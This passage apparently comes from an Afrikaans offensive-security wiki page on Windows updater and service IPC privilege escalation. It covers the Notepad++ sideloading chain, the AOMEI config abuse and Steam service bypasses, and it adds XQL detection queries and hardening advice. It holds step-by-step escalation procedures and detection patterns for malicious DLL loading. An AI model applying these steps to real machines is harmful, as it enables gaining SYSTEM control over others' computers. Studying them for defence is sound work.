   - **Gebruik jou eie getekende binary + sideload**: bundel die getekende Bitdefender-`BluetoothService.exe` en plaas ’n kwaadwillige `log.dll` in sy soekpad. Wanneer die getekende binary loop, laai Windows `log.dll` via sideload; dié dekripteer en laai die Chrysalis-backdoor reflektief (Warbird-beskermd + API-hashing om statiese opsporing te bemoeilik).
   - **Scriptgebaseerde shellcode-inspuiting**: NSIS voer ’n saamgestelde Lua-script uit wat Win32-API’s (bv. `EnumWindowStationsW`) gebruik om shellcode in te spuit en Cobalt Strike Beacon te ontplooi.<sup>[[12]](#references)</sup>

Verhardings-/opsporingswenke vir enige updater:
- Dwing **sertifikaat- en handtekeningverifikasie** van die afgelaaide installeerder af (pen die verskaffer se ondertekenaar vas, verwerp ’n CN/ketting wat nie ooreenstem nie) en onderteken die opdateringsmanifest self (bv. XMLDSig). Blokkeer manifestbeheerde herleidings tensy dit gevalideer is.
- Behandel **BYO-getekende-binary-sideloading** as ’n opsporingsleidraad ná aflaai: waarsku wanneer ’n getekende verskaffer-EXE ’n DLL met ’n naam buite sy kanonieke installasiepad laai (bv. Bitdefender wat `log.dll` vanaf Temp/Downloads laai), en wanneer ’n updater installeerders met nie-verskaffer-handtekeninge in ’n tydelike ligging plaas of uitvoer.
- Monitor **kwaadwilligespesifieke artefakte** wat in hierdie ketting waargeneem is (nuttig as algemene leidrade): mutex `Global\Jdhfv_1.0.1`, abnormale `gup.exe`-skryfbewerkings na `%TEMP%`, en Lua-gedrewe shellcode-inspuitingsfases.
- Notepad++ het gereageer deur WinGUp in v8.8.9 en later te versterk: die teruggestuurde XML word nou onderteken (XMLDSig), en nuwer weergawes dwing sertifikaat- en handtekeningverifikasie van die afgelaaide installeerder af, eerder as om slegs die transport te vertrou.<sup>[[13]](#references)</sup>

<details>
<summary>Cortex XDR XQL – sideloading van Bitdefender-getekende EXE <code>log.dll</code> (T1574.001)</summary>

```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```

</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code> wat ’n nie-Notepad++-installeerder begin</summary>

```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```

</details>

Hierdie patrone geld vir enige updater wat unsigned manifests aanvaar of nie installer-signers vaspen nie—network hijack + malicious installer + BYO-signed sideloading lei tot remote code execution onder die dekmantel van “trusted” updates.

### Kennisgewingkonfigurasie as ’n tweede update-sneller

’n Updater kan afsonderlike remote configurations gebruik om **inhoud te stage en die uitvoering daarvan te aktiveer**. Dit vereis beheer oor die configurations of hul responses; die verslae meld nie hoe toegang tot die oorsprong verkry is nie. In die AOMEI-geval het `down_html.ini` ’n archive-URL, weergawe (`thrid`) en MD5 (`Val`) gekies; die aanvaller het die weergawe verhoog en die URL en ooreenstemmende checksum saam verander. Dit is die [metadata trust-boundary failure](#2-hijacking-the-update-channel-to-run-code-as-system) wat hierbo behandel is. Die bykomende uitvoeringspad was `Notifycfg.ini`: dit het `ABNotify.exe` opdrag gegee om ’n uitgepakte `upgrade-now.html` deur ’n plaaslike `file:///`-URL in ’n WebView te laai. Die bladsy het outomaties na ’n uitvoerbare lêer in dieselfde gids genavigeer, wat die WebView aan die system shell oorgedra het. Die child het die notifier se privileges geërf; dit het nie vanself tot SYSTEM opgegradeer nie.<sup>[[17]](#references)[[18]](#references)</sup>

Google het ook ’n aangepaste `Notifycfg.ini` gerapporteer met meer as 35 000 herhaalde dummy sections wat hierdie client se normale version gate oorkom het. Die verslag bewys nie ’n algemene parser bypass nie. Die aanvaller het die remote files ná vensters van vyf tot tien minute herstel, dus het slegs clients wat gedurende dié vensters gepoll het die veranderde configuration ontvang. Hierdie notification channel het ook ’n afsonderlike [WebDAV/NTLM coercion lure](../ntlm/places-to-steal-ntlm-creds.md#remote-notification-uris-for-webdav-ntlm-coercion) bevat, waarvoor die archive nie uitgevoer hoef te word nie.<sup>[[18]](#references)</sup>

---
## Gedeeldegeheue-bootstrap na bevoorregte diens-IPC

Moenie ophou by named-pipe enumeration nie. ’n SYSTEM broker kan ’n permissive named **file mapping** vir verbindingopstelling beskikbaar stel en dan anonymous pipe-handles na die versoekende proses dupliseer. In Steam se getoetste ontwerp koördineer `Global\SteamClientService_SharedMemFile` en `Global\SteamClientService_SharedMemLock` die client-PID/event-handshake; die diens stuur twee pipe-handles terug, en daaropvolgende length-prefixed requests gebruik `RunInterface` (`0x01`). Die mapping-DACL het clients van enige integrity level toegelaat. Die interne `CSteamServiceWin32`-object in `steamclient64.dll` het ’n praktiese client verskaf: los die global op wat spesifiek vir die build is, roep vtable slot 0 `Connect` aan, en gebruik dan die interface maps in plaas daarvan om die handshake te herimplementeer. Toegang tot IPC is slegs ’n voorvereiste; die bevoorregte handler se trust decision bepaal of daar eskalasie is. <sup>[[19]](#references)[[20]](#references)</sup>

### Ondertekende manifest brei uit na ’n verouderde allowlist van uitvoerbare lêers

`IClientInstallUtils::AddInstallScriptToWhiteList` (slot 21) verifieer ’n ondertekende VDF se `kvsignatures`, maar teken die **uitgebreide padnaam van die uitvoerbare lêer** aan, nie ’n onveranderlike lêeridentiteit nie. Met ’n ondertekende `Run Process`-inskrywing soos `%INSTALLDIR%\Binaries\Prerequisites\vcredist_x86_vs2008sp1.exe`, voorsien ’n user-writable `%INSTALLDIR%`. Plaas ’n vervangende uitvoerbare lêer by daardie presies uitgebreide pad, en roep dan `RunInstallScript` (slot 22) aan met ’n unsigned VDF waarvan `Process 1` die toegelate pad benoem. Die inskrywing bly bestaan ná die uitvoering van die ondertekende script, totdat die diens herbegin; in die gerapporteerde implementering word die lêer nie weer gevalideer voordat dit deur SYSTEM geloods word nie. Laat die geplante lêernaam ooreenstem met die werklike ondertekende inskrywing, nie bloot met die prerequisite-kategorie nie. <sup>[[19]](#references)[[20]](#references)</sup>

### Child process van module-manager omseil die handtekeningkontrole vir direkte laai

`IClientModuleManager::LoadModule` (slot 0) aanvaar module-bytes wanneer die verskafde ID met hul CRC32 ooreenstem. `CallFunctionAsync` (slot 3) met `flags & 8` kies ’n **child-process**-vertakking, eerder as die direkte reflective-load-vertakking wat ’n Valve-handtekening verifieer. Die diens skryf `legacycompat\servicecall_<CRC>.dll` en loods `legacycompat\steamservice.exe /runfunc ...` vanuit die installasiegids. As daardie gids user-writable is, plaas ’n uitvoerbare lêer by die laasgenoemde pad, laai enige weggooibare module met ’n ooreenstemmende CRC, en roep die async method aan met bit 3 gestel. Die child executable en die DLL wat na skyf geskryf is, is nie in die gerapporteerde build geverifieer nie. Die module hoef nie self ’n werkende payload te wees nie: dit is die vervangde child executable wat as SYSTEM loop. <sup>[[19]](#references)[[20]](#references)</sup>

### Kontroles van catalog-lede voor bevoorregte driver-installation

Kyk vir ’n driver-install-broker of sy catalog validation **die presiese INF bind wat aan die installer deurgegee word**. In die gerapporteerde `InstallVrLinkDongleDriver`-pad valideer `WinVerifyTrust` ’n catalog en soek `CryptCATAdminCalcHashFromFileHandle` na *minstens een* ooreenstemmende lêer in ’n deur die caller verskafde gids, maar die diens voer daarna `pnputil /add-driver ... /install` op `netrtwlanuval.inf` uit sonder om vas te stel dat hierdie INF die bedoelde catalog-lid is. ’n Plat gids of ’n gids spesifiek vir ’n argitektuur word aanvaar. ’n Ondertekende catalog met enige ooreenstemmende gidslid kan dus die diens se swak kontrole slaag, selfs al verskil die INF wat aan die bevoorregte installer oorhandig word. Moenie aanvaar dat dit alleen Windows se driver-signing-beleid omseil nie: suksesvolle installasie hang steeds van die vervangingspakket en host-beleid af. <sup>[[19]](#references)[[20]](#references)</sup>

Die diens stel sy validation-handles vry voordat `pnputil` die INF oopmaak, wat ’n [TOCTOU-gap](#1-toctou-inside-updater-copyexecute-paths-msi-center-cmd_autoupdatesdk) laat met ’n driver-installation sink eerder as ’n uitvoerbare update. ’n Oplock kan ’n vervanging tussen die kontrole en die installer se open-aksie tydsbereken. Dieselfde IPC stel [secure-desktop input forwarding](../authentication-credentials-uac-and-efs/uac-user-account-control.md#secure-desktop-input-forwarded-through-a-writable-shared-memory-ring) beskikbaar, mits afsonderlike toestemmingsvoorvereistes nagekom word. <sup>[[19]](#references)</sup>

## References
- [1] [Advies – Netskope Client for Windows – Plaaslike privilege escalation via ’n kwaadwillige server (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [2] [Netskope-sekuriteitsadvies NSKPSA-2025-002](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
- [3] [NachoVPN – Netskope-plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [4] [UpSkope – Netskope IPC-client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [5] [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [6] [SensePost – ASUS DriverHub, MSI Center, Acer Control Centre en Razer Synapse 4 pwning](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [7] [0xdf – HTB: NanoCorp](https://0xdf.gitlab.io/2026/06/20/htb-nanocorp.html)
- [8] [SEC Consult – Plaaslike privilege escalation via skryfbare lêers in Checkmk Agent](https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-writable-files-in-checkmk-agent/)
- [9] [Checkmk Werk #16361 – Privilege escalation in Windows-agent](https://checkmk.com/werk/16361)
- [10] [sensepost/bloatware-pwn PoC’s](https://github.com/sensepost/bloatware-pwn)
- [11] [CyberArk PipeViewer](https://github.com/cyberark/PipeViewer)
- [12] [Unit 42 – Staatsakteurs buit Notepad++-supply chain uit](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [13] [Notepad++ – opdatering oor die gekaapte infrastruktuurvoorval](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)
- [14] [AmberWolf – Omseiling van die regstelling vir CVE-2025-0309 in Netskope Client for Windows](https://blog.amberwolf.com/blog/2026/march/patch-bypass---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [15] [Atredis – Ontdekking van privilege escalation-foute in Lenovo Vantage](https://www.atredis.com/blog/2025/7/7/uncovering-privilege-escalation-bugs-in-lenovo-vantage)
- [16] [Quarkslab – MyReport Updater: Van gRPC na SYSTEM](https://blog.quarkslab.com/myreport-updater-from-grpc-to-system.html)
- [17] [ManageEngine Threat Analysis Lab – AOMEI Backupper-supply-chain-kompromittering](https://www.manageengine.com/threat-analysis-lab/aomei-backupper-supply-chain-compromise.html)
- [18] [Google Threat Intelligence Group en Mandiant – Ondersoek na kortstondige supply-chain-peutering](https://cloud.google.com/blog/topics/threat-intelligence/investigating-ephemeral-supply-chain-tampering)
- [19] [Atredis – Om die Valve draai](https://atredis.com/blog/2026/10/28/turning-the-valve)
- [20] [Atredis – Om die Valve draai PoC’s](https://github.com/atredispartners/proof-of-concept/tree/main/turning-the-valve/code)
